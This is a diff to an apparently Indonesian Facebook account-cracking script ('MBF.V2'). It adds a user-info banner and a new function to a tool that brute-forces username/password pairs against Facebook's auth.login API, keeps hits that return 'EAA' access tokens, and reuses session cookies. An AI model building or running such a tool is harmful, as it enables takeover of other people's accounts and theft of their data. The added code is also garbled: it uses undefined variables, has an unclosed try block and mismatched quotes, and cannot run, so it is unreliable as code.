@@ -8,6 +8,9 @@
 import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
 from concurrent.futures import ThreadPoolExecutor
+from datetime import date
+from datetime import datetime
+current = datetime.now()
 
 def mulai():
     os.system("git pull")
@@ -154,6 +157,7 @@ def mbfv2():
              else:
                   os.system("xdg-open https://youtu.be/QF0jMxC6CkE") 
                   os.system('rm -rf cookies')
+                  yoi()
                   print(" \n \x1b[1;97m[\x1b[1;91m!!\x1b[1;97m] Cookie Salah")
                   os.system('python MBF.V2.py')
          def login(username,password,cek=False):
@@ -172,6 +176,7 @@ def mbfv2():
              }
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
+             nama = a["name"]
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * 👉 {username}[▪]{password}                       ",end="")
                  print()
@@ -258,9 +263,21 @@ def mbfv2():
                    ses = requests.Session()
                    kukis = masuk()
                    kuki = {'cookie':kukis}
+         def asu():
+             global ua
+             try:
+                 cek = open("cookies").read()
+                 response = requests.get(api, params=params)
+                 nama = a["first_name"]
+                 ttl = a["birthday"]
+                 id = a["id"]
                    lupo_lupo_milzu()
                    menu()
                    peak()
+                   aink(' Welcome User \033[1;32m"+nama))
+                   aink(' ID Kamu : \033[1;32m"+id))
+                   aink(' Tanggal lahir kamu     : \033[1;32m"+ttl))
+                   aink(' Kamu Join  : \033[1;32m"+durasi))
                    aink('\033[92m『PILIH METODE CRACK』')
                    aink('\033[90m[\033[96m?\033[90m] \033[92m01\033[97m.\033[96mŘÔĶÊĎ ĎÂFŤÂŘ ŤÊMÂŇ')
                    aink('\033[90m[\033[96m?\033[90m] \033[92m02\033[97m.\033[96mŘÔĶÊĎ ĎÂŘÎ ŁÎĶÊ PÔŠŠŤÎŇĞÂŇ')
